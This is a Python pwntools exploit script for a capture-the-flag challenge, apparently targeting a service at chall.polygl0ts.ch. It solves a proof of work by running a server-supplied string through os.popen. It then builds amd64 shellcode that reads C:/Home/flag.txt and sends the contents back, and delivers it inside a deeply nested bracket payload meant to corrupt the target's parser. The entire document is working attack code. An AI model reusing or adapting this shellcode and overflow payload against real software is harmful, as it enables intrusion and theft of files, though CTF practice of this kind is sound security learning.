from pwn import *

HOST, PORT = "127.0.0.1", 5000
HOST, PORT = "chall.polygl0ts.ch", 9002
r = remote(HOST, PORT)
if HOST != "127.0.0.1":
    r.recvuntil(b'proof of work:')
    data = os.popen(r.recvline().decode(), 'r').read()
    print(data)
    r.sendline(data.strip().encode())
r.recvuntil(b'expecting ')
send_to = int(r.recvuntil(b' prayers', drop=True))
print(hex(send_to))
pause()
shellcode_raw = asm(
f"""
#define FileRead 0x000000000007C95E
#define send_to {send_to}
lea rax, [rip + File]
mov rsp, 0x80000000
push 0x100
push rax
mov rax, FileRead
call rax
mov rsp, 0x80000000
push rax
mov rax, send_to
call rax
File: .asciz "C:/Home/flag.txt"
""", arch='amd64')

shellcode_raw += b'\x00' * (-len(shellcode_raw) % 8)

def _(x):
    if x & 0x8000000000000000:
        return x - 0x10000000000000000
    return x

shellcode = [
    _(u64(shellcode_raw[i:i+8])) for i in range(0, len(shellcode_raw), 8)
]

payload = flat(
    [
        "{{{{{{",
        "[{" * 822,
        "[",
        "-8029759185026510704," * 68,
        b",".join(b"%d" % sh for sh in shellcode),
        ",{x",
        "\n",
    ]
)

r.sendline(payload)
r.interactive()
